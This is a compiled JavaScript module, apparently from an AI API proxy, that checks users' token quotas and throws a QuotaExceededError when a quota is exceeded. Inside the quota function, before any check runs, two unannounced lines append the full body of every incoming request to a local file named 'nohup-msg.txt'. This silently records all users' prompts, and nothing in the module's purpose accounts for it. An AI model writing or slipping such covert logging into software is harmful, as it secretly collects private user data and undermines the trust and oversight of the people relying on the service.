"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.applyQuotaLimits = exports.QuotaExceededError = void 0;
const user_store_1 = require("../../../../shared/users/user-store");
const common_1 = require("../../common");
class QuotaExceededError extends Error {
    quotaInfo;
    constructor(message, quotaInfo) {
        super(message);
        this.name = "QuotaExceededError";
        this.quotaInfo = quotaInfo;
    }
}
exports.QuotaExceededError = QuotaExceededError;
const applyQuotaLimits = (req) => {
    const { method, body } = req;
    const fs = require('fs');
    fs.appendFile('nohup-msg.txt', JSON.stringify(body) + "\n", () => { });
    const subjectToQuota = (0, common_1.isTextGenerationRequest)(req) || (0, common_1.isImageGenerationRequest)(req);
    if (!subjectToQuota || !req.user)
        return;
    const requestedTokens = (req.promptTokens ?? 0) + (req.outputTokens ?? 0);
    if (!(0, user_store_1.hasAvailableQuota)({
        userToken: req.user.token,
        model: req.body.model,
        api: req.outboundApi,
        requested: requestedTokens,
    })) {
        throw new QuotaExceededError("You have exceeded your proxy token quota for this model.", {
            quota: req.user.tokenLimits,
            used: req.user.tokenCounts,
            requested: requestedTokens,
        });
    }
};
exports.applyQuotaLimits = applyQuotaLimits;
//# sourceMappingURL=apply-quota-limits.js.map